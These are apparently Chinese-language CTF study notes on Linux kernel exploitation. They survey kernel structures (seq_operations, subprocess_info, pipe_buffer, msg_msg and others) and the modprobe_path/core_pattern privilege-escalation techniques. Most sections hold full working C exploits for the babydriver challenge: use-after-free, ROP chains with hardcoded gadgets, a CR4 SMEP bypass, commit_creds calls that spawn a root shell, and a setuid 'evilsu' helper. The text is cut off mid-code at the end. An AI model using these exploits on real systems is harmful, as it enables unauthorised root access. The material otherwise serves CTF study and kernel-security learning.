控制流劫持\n\n在用户态执行`open(\"/proc/self/stat\",0);`后，内核中的调用过程如下图所示：\n\n![image-20221231182402133](image-20221231182402133.png?size=600)\n\n内核中会调用[single_open()](https://elixir.bootlin.com/linux/v4.4.72/source/fs/seq_file.c#L565)函数，而该函数中会为[struct seq_operations](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/seq_file.h#L36) 结构体申请一段内存空间（0x20字节大小）。\n\n![image-20221231182738559](image-20221231182738559.png?size=600)\n\n`open()`操作后，用户态获得一个文件描述符fd。当用户态对该fd进行读操作`read(fd,buf,size)`时，在内核中会调用`seq_operations->start`函数指针，内核调用栈如下：\n\n![image-20221231185654243](image-20221231185654243.png?size=600)\n\n如果利用漏洞改掉结构体中的start函数指针，就能实现控制流劫持。\n\n另外，`read(fd,buf,size)`操作过程中也会调用`seq_operations->stop`函数指针，内核调用栈如下：\n\n![image-20230228192402442](image-20230228192402442.png?size=600)\n\n### 信息泄露\n\n`seq_operations` 结构体中只含有4个函数指针，因此只能泄露内核基址，无法泄露出其他信息。\n\n```c\nstruct seq_operations {\n\tvoid * (*start) (struct seq_file *m, loff_t *pos);\n\tvoid (*stop) (struct seq_file *m, void *v);\n\tvoid * (*next) (struct seq_file *m, void *v, loff_t *pos);\n\tint (*show) (struct seq_file *m, void *v);\n};\n```\n\n\n\n## babydriver利用示例\n\n```c\n// test.c\n// gcc test.c -static -masm=intel  -o test\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint fd_stat;\n__uint64_t temp_buf[4];\n__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret\n__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b\n__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret\n__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret\n__uint64_t iretq = 0xffffffff81884177;                  // iretq\n\n__uint64_t fake_stack[20];\n__uint64_t fake_stack_addr = &fake_stack;\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\n__uint64_t commit_creds = 0xffffffff8106fed0;\n__uint64_t prepare_kernel_cred = 0xffffffff81070260;\nvoid get_root(){\n    void* (*pkc)(int) = prepare_kernel_cred;\n    int (*cc)(void*) = commit_creds; \n    (*cc)((*pkc)(0));\n}\n\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\n\nint main(){\n    save_status();\n\n    printf(\"fake_stack_addr: 0x%llx\\n\",fake_stack_addr);\n\tint fd1 = open(\"/dev/babydev\",2);\n\tint fd2 = open(\"/dev/babydev\",2);\t\t\n\n\tioctl(fd1,0x10001,0x20);\t\t\t\t\n\tclose(fd1);\t\t\t\t\t\t\t\t\t\n\n\tfd_stat = open(\"/proc/self/stat\",0);\n\n    __uint64_t gadget1 = 0xffffffff815f5951;            // add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret\n    write(fd2,&gadget1,8);\n    // char* gadget1_addr = \"\\x51\\x59\\x5f\\x81\\xff\\xff\\xff\\xff\\xff\";\n    // write(fd2,gadget1_addr,8);\n\n    // 1. change rsp\n    // 2. rc4 = 0x6f0\n    // 3. swapgs;iret\n    // 4. system(\"/bin/sh\")\n    fake_stack[0] = pop_rax_ret;\n    fake_stack[1] = 0x6f0;\n    fake_stack[2] = mov_cr4_rax_ret;\n    fake_stack[3] = 0xffff;         // rbp, padding\n    fake_stack[4] = get_root;\n    fake_stack[5] = swapgs_ret;\n    fake_stack[6] = iretq;\n    fake_stack[7] = get_shell;\n    fake_stack[8] = user_cs;\n    fake_stack[9] = user_rflags;\n    fake_stack[10] = user_sp;\n    fake_stack[11] =  user_ss;\n\n    __asm__(\n        \"mov r15, 0x15151515;\"\n        \"mov r14, 0x14141414;\"      // 4\n        \"mov r13, mov_rsp_rax_ret;\"      // 3\n        \"mov r12, fake_stack_addr;\"      // 2\n        \"mov r11, 0x11111111;\"\n        \"mov r10, 0x10101010;\"      // r10\n        \"mov rbp, 0xbbbbbbbb;\"      // 5\n        \"mov rbx, pop_rax_ret;\"      // 1\n        \"mov r9, 0x99999999;\"       // r9\n        \"mov r8, 0x88888888;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x20;\"\n        \"mov rsi, temp_buf;\"\n        \"mov rdi, fd_stat;\"\n        \"syscall\"\n    );\n\n    close(fd_stat);\n\tclose(fd2);\t\t\n\n\treturn 0;\n}\n```\n\n\n\n同利用方法的题：\n\n[西湖论剑2021线上初赛easykernel题解](https://www.anquanke.com/post/id/260055)\n\n[在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法](https://www.anquanke.com/post/id/266897)\n\n[kernel 劫持seq_operations && 利用pt_regs](https://blog.csdn.net/weixin_45566993/article/details/124791812)\n\n\n\n# subprocess_info\n\n## 利用能力\n\n### 控制流劫持\n\n当我们在用户态执行`socket(22, AF_INET, 0);` 时，内核调用栈如下图所示：\n\n![image-20221231175833470](image-20221231175833470.png?size=600)\n\n可以看到，内核中会调用到 [call_usermodehelper_setup()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L519)函数，而该函数中会为 [struct subprocess_info](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/kmod.h#L56) 结构体申请一段内存空间（0x60字节大小）。\n\n![image-20221231174850423](image-20221231174850423.png?size=600)\n\n在[call_modprobe()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L69)成功调用[call_usermodehelper_setup()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L519)函数后，会继续调用[call_usermodehelper_exec()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L555) -> [call_usermodehelper_freeinfo()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L191)。最后这个函数中，调用了刚刚申请的 ` subprocess_info ` 结构体中存储的 `cleanup` 函数指针。如果能在申请 ` subprocess_info `  结构体和使用 `cleanup` 函数指针的短暂时间间隔内，改写 `info->cleanup` ，那么就能达到控制流劫持的目的。\n\n```c\nstatic void call_usermodehelper_freeinfo(struct subprocess_info *info)\n{\n\tif (info->cleanup)\n\t\t(*info->cleanup)(info);\n\tkfree(info);\n}\n```\n\n如何利用这个短暂的时间窗口呢？答案当然离不开条件竞争！父线程不断调用`socket(22, AF_INET, 0);` 申请和释放 `subprocess_info` 结构体空间，子线程利用UAF或其他漏洞改写 `info->cleanup`  函数指针位置。这样，通过父子线程的配合，就有机会劫持控制流。\n\n### 信息泄露\n\n`subprocess_info` 结构体中包含的内容较丰富：\n\n- 泄露内核基址：init、cleanup、work.func都是函数指针，且work.func可能指向`call_usermodehelper_exec_work()`，而init可能为空\n- 泄露堆地址：work.entry链表头节点存储着堆地址，argv指向堆空间\n\n```c\nstruct subprocess_info {\n\tstruct work_struct work;\n\tstruct completion *complete;\n\tchar *path;\t\t\t\t// 指向内核数据段，modprobe_path变量\n\tchar **argv;\n\tchar **envp;\t\t\t// 指向内核数据段，envp_35657静态变量\n\tint wait;\n\tint retval;\n\tint (*init)(struct subprocess_info *info, struct cred *new);\n\tvoid (*cleanup)(struct subprocess_info *info);\n\tvoid *data;\n};\n\nstruct work_struct {\n\tatomic_long_t data;\n\tstruct list_head entry;\n\twork_func_t func;\n#ifdef CONFIG_LOCKDEP\n\tstruct lockdep_map lockdep_map;\n#endif\n};\n```\n\n\n\n## babydriver利用示例\n\n```c\n// test.c\n// gcc test.c --static -masm=intel -lpthread -o test\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include<fcntl.h>\n#include<sys/socket.h>\n#include<pthread.h>\n#include<sys/ioctl.h>\n#include<sys/mman.h>\n\nint race_flag = 0;\nstatic int fd1 = 0;\nstatic int fd2 = 0;\n__uint64_t target_buf[2];\n\n__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret\n\n__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret\n__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret\n__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret\n__uint64_t iretq = 0xffffffff81884177;                  // iretq\n\n\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\n\n__uint64_t commit_creds = 0xffffffff8106fed0;\n__uint64_t prepare_kernel_cred = 0xffffffff81070260;\n__uint64_t init_cred_addr = 0xffffffff81b79a60;\nvoid get_root(){\n    race_flag = 1;                                      // 条件竞争成功后，置flag\n    // void* (*pkc)(int) = prepare_kernel_cred;         // 不知道为什么，执行这个函数过程中会报double fault的错误，而且貌似跟kmalloc有关\n    int (*cc)(void*) = commit_creds; \n    (*cc)(init_cred_addr);\n}\n\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\n\nvoid race(){\n    target_buf[0] = xchg_esp_eax_ret;\n    target_buf[1] = 0x11111111;\n\n   \t// 控制流劫持时执行的指令是`call rax`，rax为xchg_esp_eax_ret，即0xffffffff8100008a。执行`xchg esp, eax ; ret`后，rsp变为`0x8100008a`，因此需要在0x8100008a处布置好ROP链\n    // set esp area\n    __uint64_t fake_stack_addr = ((__uint64_t)xchg_esp_eax_ret & 0xffffffff);\n    if(mmap((char*)(fake_stack_addr&(~0xfff)),0x2000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) == MAP_FAILED){\n        perror(\"mmap failed.\");\n    }\n\n    __uint64_t* fake_stack_ptr = (__uint64_t*)fake_stack_addr;\n    int index = 0;\n    fake_stack_ptr[index++] = pop_rax_ret;\n    fake_stack_ptr[index++] = 0x6f0;\n    fake_stack_ptr[index++] = mov_cr4_rax_ret;\n    fake_stack_ptr[index++] = 0xffff; \n    fake_stack_ptr[index++] = get_root;\n    fake_stack_ptr[index++] = swapgs_ret;\n    fake_stack_ptr[index++] = iretq;\n    fake_stack_ptr[index++] = get_shell;\n    fake_stack_ptr[index++] = user_cs;\n    fake_stack_ptr[index++] = user_rflags;\n    fake_stack_ptr[index++] = user_sp;\n    fake_stack_ptr[index++] = user_ss;\n\n    while(1){\n        write(fd2,target_buf,0x60+0x50);            // 子线程改struct subprocee_info中的cleanup函数指针（subprocess_info结构体不能覆盖前几个成员，此write有彩蛋）\n        if(race_flag){\n            printf(\"child: detect race happen\\n\");\n            break;\n        }\n    }\n\n}\n\n\nint main(){\n    save_status();\n\n    fd1 = open(\"/dev/babydev\",2);\n    fd2 = open(\"/dev/babydev\",2);\t\t\n\n\tioctl(fd1,0x10001,0x60);\t\t\t\t\n\tclose(fd1);\t\t\t\t\t\t\t\t\t\n\n    pthread_t th1;\n    pthread_create(&th1,NULL,race,NULL);\n    while(1){\n        usleep(1);\n        socket(22,AF_INET,0);                   // 父线程触发malloc struct subprocess_info\n        if(race_flag){\n            printf(\"parent: detect race happen\\n\");\n            break;\n        }\n    }\n\n\tclose(fd2);\t\t\n\n\treturn 0;\n}\n```\n\n\n\n同利用方法的题：\n\n[SCTF flying_kernel 出题总结](https://www.anquanke.com/post/id/264563)\n\n[2020 ASIS Shared House Write-up](https://ljp-tw.github.io/blog/ASIS-CTF-shared_house/#)\n\n\n\n# pipe_buffer\n\n## 利用能力\n\n### 控制流劫持\n\n用户态执行`pipe(pipe_fd)`后，内核态调用过程如下图所示\n\n![image-20230102234711716](image-20230102234711716.png?size=600)\n\n虽然 [alloc_pipe_info() ](https://elixir.bootlin.com/linux/v4.4.72/source/fs/pipe.c#L610)函数中为 [PIPE_DEF_BUFFERS](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/pipe_fs_i.h#L4) 个 [struct pipe_buffer](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/pipe_fs_i.h#L20) 申请的空间大小为0x280个字节，但内核实际会为它分配0x400即1k字节大小的堆块。\n\n![image-20230102235352192](image-20230102235352192.png?size=600)\n\npipe管道创建成功后，用户态将获得两个文件描述符fd[2]，其中fd[0]为从管道读，fd[1]为向管道写。当用户态对管道进行write操作后，调用 `close()` 关闭文件描述符时，将会触发`pipe_buffer`中的`ops->release`函数。\n\n如果在write之后，调用close之前，利用漏洞将pipe_buffer->ops改成伪造的函数表地址，就能执行假ops中的假release函数，即实现控制流劫持。（write非必要条件，经过调试发现，即使不调用write，直接调用close函数也能达到控制流劫持的效果）\n\n### 信息泄露\n\npipe_buffer结构体中`*ops`指向代码段的函数表 [anon_pipe_buf_ops](https://elixir.bootlin.com/linux/v4.4.72/source/fs/pipe.c#L218)，通过它可以泄露内核基址。\n\n```c\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\n\n\n## babydriver利用示例\n\n```c\n// test.c\n// gcc test.c --static -masm=intel -lpthread -o test\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include<errno.h>\n\nsize_t fake_pipe_ops[5];\nsize_t fake_pipe_buffer[5];\n\nsize_t pkc_addr = 0xffffffff81070260;\nsize_t cc_addr = 0xffffffff8106fed0;\nvoid get_root(){\n    char* (*pkc)(int) = pkc_addr;\n    void (*cc)(char*) = cc_addr;\n    (*cc)((*pkc)(0));\n}\n\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    save_status();\n\n    size_t mov_rsp_rax = 0xffffffff818855cf;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b\n    size_t pop_rsp_ret = 0xffffffff81010fd7;     // pop rsp ; ret\n\n\n    size_t rop_chain[30] = {0};\n    int index = 0;\n    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;\n    rop_chain[index++] = 0x6f0;\n    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret \n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = (size_t)get_root;\n    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret \n    rop_chain[index++] = 0xffffffff81884177;        // iretq; \n    rop_chain[index++] = (size_t)get_shell;\n    rop_chain[index++] = user_cs;\n    rop_chain[index++] = user_rflags;\n    rop_chain[index++] = user_sp;\n    rop_chain[index++] = user_ss;\n\n\n    fake_pipe_buffer[0] = 0x01010101;\n    fake_pipe_buffer[1] = 0x02020202;\n    fake_pipe_buffer[2] = fake_pipe_ops;\n    fake_pipe_buffer[3] = 0x03030303;\n\n    fake_pipe_ops[0] = pop_rsp_ret;          // pop rsp; ret\n    fake_pipe_ops[1] = rop_chain;          // rop_chain\n    fake_pipe_ops[2] = mov_rsp_rax;          // control rip - xchg rsp,rax; ret\n    fake_pipe_ops[3] = 0x33333333;\n    fake_pipe_ops[4] = 0x44444444;\n\n\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0x400);\n    close(fd1);\n\n    int pipe_fd[2];\n    pipe(pipe_fd);\n\n    // write(pipe_fd[1],\"test_str\",0x8);\n    write(fd2,fake_pipe_buffer,0x20);\n\n    close(pipe_fd[0]);\n    close(pipe_fd[1]);\n    close(fd2);\n\treturn 0;\n}\n```\n\n\n\n同利用方法的题：\n\n[管道pipe在内核漏洞利用中的应用](https://blog.csdn.net/Breeze_CAT/article/details/124887622)\n\n[N1CTF 2022 Praymoon Write Up](https://www.ctfiot.com/76392.html)\n\n[条件竞争 && pipe_buffer + 堆喷射 ](https://www.cnblogs.com/pwnfeifei/p/16281180.html)\n\n[【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记](https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/)\n\n[D3CTF2022 - Pwn - d3kheap 题解](https://cn-sec.com/archives/1055446.html)\n\n\n\n# shm_file_data介绍\n\n```c\n#include<sys/shm.h>\nint shmid;\nif ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {\n  perror(\"shmget\");\n  return 1;\n}\nchar *shmaddr = shmat(shmid, NULL, 0);\nif (shmaddr == (void*)-1) {\n  perror(\"shmat\");\n  return 1;\n}\n```\n\n当用户态执行以上代码时，`shmat()`函数对应的内核态调用过程如下图所示\n\n![image-20230108001336271](image-20230108001336271.png?size=600)\n\n内核中调用 [do_shmat()](https://elixir.bootlin.com/linux/v4.4.72/source/ipc/shm.c#L1086) 函数，为 [struct shm_file_data](https://elixir.bootlin.com/linux/v4.4.72/source/ipc/shm.c#L50) 结构体申请一段内存空间（0x20字节大小）。\n\n![image-20230108002655194](image-20230108002655194.png?size=600)\n\n根据结构体信息，可以总结该结构体的能力：\n\n- 可泄露内核地址信息：`ns`和`vm_ops`两个指针均指向内核数据区，因此可能泄露\n- 可泄露堆地址信息：`file`指针指向堆区域，因此可泄露\n- 不可控制流劫持：虽然`vm_ops`指向的函数表中有许多函数指针，但当前没找到合适的调用方式\n\n\n\n# msg_msg介绍\n\n> 创建一个消息队列，并往消息队列中写入数据的过程中，内核态会为“msg_msg结构体+用户数据”申请一段内存空间。\n>\n> msg_msg的利用场景：通常是利用该结构体的相关特性将堆溢出转换成UAF\n\n```c\n#include <sys/types.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n\nint msqid;\nstruct msgp{\n  long type;\n  char mtext[256];\n};\n\nif((msqid = msgget(IPC_PRIVATE,IPC_CREAT|0666)) == -1){\n  perror(\"msgget\");\n  return 1;\n}\n\nstruct msgp msgp1;\nmsgp1.type = 1;\nstrcpy(msgp1.mtext,\"aaaaaaaaaaaaaaaaaaaaaaa\");\nif(msgsnd(msqid,&msgp1,sizeof(msgp1.mtext),0) == -1){\n  perror(\"msgsnd\");\n  return 1;\n}\n```\n\n当用户态执行以上代码时，`msgsnd()`函数对应的内核态调用过程如下图所示\n\n![image-20230108170122639](image-20230108170122639.png?size=600)\n\n内核中调用 [do_msgsnd()](https://elixir.bootlin.com/linux/v4.4.72/source/ipc/msg.c#L609) 函数，为 [struct msg_msg](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/msg.h#L8) 和用户态传递的`msgp1.mtext`共同申请一段内存空间（根据`mtext`大小的不同，从0x31~0x1000字节大小都有可能）。\n\n![image-20230108170731053](image-20230108170731053.png?size=600)\n\n需要特别注意`struct msg_msgseg *next`这个指针的用途，`msgsnd()`函数发送单个消息的最大长度是8192字节（0x2000），在 [alloc_msg()](https://elixir.bootlin.com/linux/v4.4.72/source/ipc/msgutil.c#L51) 函数中，根据单个消息的长度，最多会将消息分成三段（kmalloc三次内存）来存储。如下图，[这篇文章](https://blog.csdn.net/Breeze_CAT/article/details/124150959)中有详细的代码分析过程，并且总结了几种msg_msg结构体的利用思路。\n\n![image-20230108181608984](image-20230108181608984.png?size=600)\n\n\n\n根据结构体信息，可以总结该结构体的能力：\n\n- 可泄露堆地址信息：next指向下一段消息（堆空间）。另外，`struct list_head m_list`作为链表头，也存放着堆地址。`void *security`也指向堆空间，且`msgrcv()`时这个空间会被free，某下利用场景下会有用。写的时候需注意，前48个字节（msg_msg结构体区域）不可重写。\n\n\n\n另一个常用到的函数是`msgrcv()`，它用于将`msgp1.mtext`的内容从内核堆中读取到用户态。如果在`msgsnd()`和`msgrcv()`执行之间，利用漏洞将该内核堆中的内容放置一些内核指针或堆栈地址，那么就能泄露这些信息给用户态。这里简单记一下`msgrcv()`函数的调用过程和关键函数，方便做题时调试定位。\n\n```c\nchar* recv_msg = malloc(0x1000);\nint result;\nresult = msgrcv(msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR);\nif (result<0)\n{\n    perror(\"msgrcv\");\n    exit(1);\n}\n////////////////第一种情况///////////////\n// msgrcv()\n// -----⬇------- 用户态传入的msgflg无MSG_COPY标志\n// ksys_msgrcv()\n//      ⬇\n// do_msgrcv()\n//  \t⬇\n// find_msg() -> do_msg_fill() -> free_msg()\t\t\t\n//\t\t\t\t     ⬇\n//               store_msg()\n// find_msg()：定位正确的消息，后将消息从队列中unlink\n// do_msg_fill() -> store_msg()：将数据从内核态拷贝到用户态\n// free_msg()：释放消息\n\nchar* recv_msg = malloc(0x1000);\nint result;\nresult = msgrcv(msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR|MSG_COPY);\nif (result<0)\n{\n    perror(\"msgrcv\");\n    exit(1);\n}\n////////////////第二种情况///////////////\n// msgrcv()\n// -----⬇------- 用户态传入的msgflg有MSG_COPY标志（编译内核时需要开启CONFIG_CHECKPOINT_RESTORE选项）\n// ksys_msgrcv()\n//      ⬇\n// do_msgrcv()\n//  \t⬇\n// prepare_copy() -> find_msg() -> copy_msg() -> do_msg_fill() -> free_msg()\t\t\t\n//\t\t\t\t                                      ⬇\n//                                                store_msg()\n// prepare_copy()：先申请一段内存空间，用于后面存放消息备份\n// find_msg()：定位正确的消息，由于MSG_COPY标志的存在，将跳过消息队列的unlink操作（在漏洞利用时，有时会覆盖掉msg_msg的双链表指针，unlink操作会导致崩溃。在开启CONFIG_CHECKPOINT_RESTORE选项的内核中，有了MSG_COPY标志，就可以避免该崩溃）\n// copy_msg()：将找到的消息拷贝到消息备份中。后续的操作都是针对消息备份，不会改变消息队列中原来的消息\n// do_msg_fill() -> store_msg()：将消息备份中的数据从内核态拷贝到用户态\n// free_msg()：释放消息备份\n```\n\n\n\n消息队列编程参考：\n\n[消息队列函数(msgget、msgctl、msgsnd、msgrcv)及其范例](https://blog.csdn.net/guoping16/article/details/6584024)\n\n[Linux进程间通讯|消息队列](https://blog.51cto.com/u_15467009/4869136)\n\n类似题目：\n\n[从两道0解题看Linux内核堆上msg_msg对象扩展利用](https://bbs.kanxue.com/thread-269311.htm)\n\n[Linux内核中利用msg_msg结构实现任意地址读写](https://blog.csdn.net/panhewu9919/article/details/120820617?spm=1001.2014.3001.5502)\n\n\n\n# timerfd_ctx介绍\n\n```c\n#include <sys/timerfd.h>\n\nstruct itimerspec timespec = {{0, 0}, {100, 0}};\nint tfd = timerfd_create(CLOCK_REALTIME, 0);\ntimerfd_settime(tfd, 0, &timespec, 0);\n```\n\n当用户态执行以上代码时，`timerfd_create()`函数对应的内核态调用过程如下图所示\n\n![image-20230110173245460](image-20230110173245460.png?size=600)\n\n内核中调用到 [timerfd_create](https://elixir.bootlin.com/linux/v4.4.72/source/fs/timerfd.c#L386) 系统调用处理函数，为 [struct timerfd_ctx](https://elixir.bootlin.com/linux/v4.4.72/source/fs/timerfd.c#L29) 申请一段内存空间（0xf0字节大小，对应kmalloc-256）。\n\n![image-20230110175125429](image-20230110175125429.png?size=600)\n\n根据结构体信息及调试信息，总结该结构体能力：\n\n- 可泄露内核地址信息：`t.tmr.function`（在`timerfd_ctx`中偏移0x28位置）\n- 可泄露堆地址信息：`t.tmr.base`（在`timerfd_ctx`中偏移0x30位置），以及偏移0xa8和0xb0处的list_head链表结构\n\n\n\n# modprobe_path\n\n## 使用方法\n\n> [LiKE Techniques: modprobe_path](https://sam4k.com/like-techniques-modprobe_path/) 中详细讲述了`modprobe_path`的处理过程。\n>\n> [Linux Kernel Exploitation Technique: Overwriting modprobe_path](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique) 中以一个例题说明了如何利用`modprobe_path`。\n\n当用户态调用execve运行一个无法识别格式的二进制程序时，内核会通过 [call_modprobe()](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L69) 函数执行内核全局变量`modprobe_path` 指明的程序（`/sbin/modprobe`），调用过程如下图所示：\n\n![image-20230109000638136](image-20230109000638136.png?size=600)\n\n可通过如下方式找到modeprobe_path所在的内存地址\n\n```\ngef➤  p modprobe_path\n$1 = \"/sbin/modprobe\", '\\000' <repeats 241 times>\ngef➤  p &modprobe_path\n$2 = (char (*)[256]) 0xffffffff81b78680 <modprobe_path>\ngef➤  x/s 0xffffffff81b78680\n0xffffffff81b78680 <modprobe_path>:\t\"/sbin/modprobe\"\n```\n\n因此，如果能利用漏洞将`modprobe_path`的值改成我们的攻击脚本，就能实现以root权限执行任意命令的效果。\n\n[这个视频](https://www.youtube.com/watch?v=6dFmH_JEF4s) 中提到了利用modprobe_path的一般方法：\n\n```c\nsystem(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag' > /tmp/x\");\nsystem(\"chmod +x /tmp/x\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\nsystem(\"chmod +x /tmp/dummy\");\n// 然后，利用漏洞将modprobe_path改为/tmp/x\n// 最后，执行/tmp/dummy，内核将调起/tmp/x，把flag的廯设置为777\n```\n\n## babydriver利用示例\n\n```c\n// test.c\n// gcc test.c -static -masm=intel  -o test\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include<errno.h>\n\n\nvoid get_flag(){\n    system(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag.txt' > /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n    system(\"/tmp/dummy\");\n    sleep(0.3);\n    system(\"cat /flag.txt\");\n    exit(0);\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    save_status();\n\n    size_t mov_rsp_rax = 0xffffffff818855cf;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b\n    size_t pop_rax = 0xffffffff8101c216;        // pop rax; ret; \n    \n    size_t rop_chain[30] = {0};\n    int index = 0;\n    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;\n    rop_chain[index++] = 0x782f706d742f;            // /tmp/x\n    rop_chain[index++] = 0xffffffff810048c2;        // pop rbx ; ret\n    rop_chain[index++] = 0xffffffff81b78680;        // &modprobe_path\n    rop_chain[index++] = 0xffffffff810e0215;        // mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret;\n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret \n    rop_chain[index++] = 0xffffffff81884177;        // iretq; \n    rop_chain[index++] = (size_t)get_flag;\n    rop_chain[index++] = user_cs;\n    rop_chain[index++] = user_rflags;\n    rop_chain[index++] = user_sp;\n    rop_chain[index++] = user_ss;\n\n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=mov_rsp_rax;   \n    }\n\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0x2e0);\n    close(fd1);\n\n    int fd_tty = open(\"dev/ptmx\",O_RDWR | O_NOCTTY);\n    if(fd_tty < 0){\n        printf(\"[+] cannot open /dev/ptmx\\n\");\n        printf(\"[+] ptmx errorno: %d\\n\",errno);\n        goto exit;\n    }\n\n    size_t tty_struct_leak[4];\n    read(fd2,tty_struct_leak,32);\n    \n    tty_operations_fake[0] = pop_rax;\n    tty_operations_fake[1] = (size_t)rop_chain;\n    tty_operations_fake[2] = mov_rsp_rax;\n\n    tty_struct_leak[3] = (size_t)tty_operations_fake;\n    write(fd2,tty_struct_leak,32);\n\n    size_t a[4] = {0,0,0,0};\n    write(fd_tty,a,32);\n    // ioctl(fd_tty,0x100,32);\nexit:\n    close(fd2);\n\treturn 0;\n}\n```\n\n## core_pattern\n\n> 除了modprobe_path，还有core_pattern可以在利用时考虑。\n>  \n> 另外还有一些提权时可劫持的变量，如poweroff_cmd、uevent_helper等，参考文章：[call_usermodehelper提权路径变量总结](https://www.jianshu.com/p/a2259cd3e79e)  \n\n对于利用core_pattern提权，首先，找到内核中存储core_pattern的位置：`validate_coredump_safety()`函数中有core_pattern\n\n用法总结：\n\n1. 准备好/tmp/x脚本，/tmp/evilsu提权程序，/tmp/trigger触发程序\n\n   /tmp/x内容：\n\n   ```bash\n   #!/bin/sh\n   chown 0:0 /tmp/evilsu\n   chmod 777 /tmp/evilsu\n   chmod u+s /tmp/evilsu\n   ```\n\n   evilsu.c内容：\n\n   ```c\n   // gcc evilsu.c -static -o evilsu\n   #include <stdlib.h>\n   #include <stdio.h>\n   #include <unistd.h>\n   #include <sys/types.h>\n   \n   int main() {\n       puts(\"[*] trying to spawn root shell\");\n       setuid(0);\n       setgid(0);\n       system(\"/bin/sh\");\n       return 0;\n   }\n   ```\n\n   trigger.c内容：\n\n   ```c\n   // gcc trigger.c -static -o trigger\n   int main() {\n       char *p = 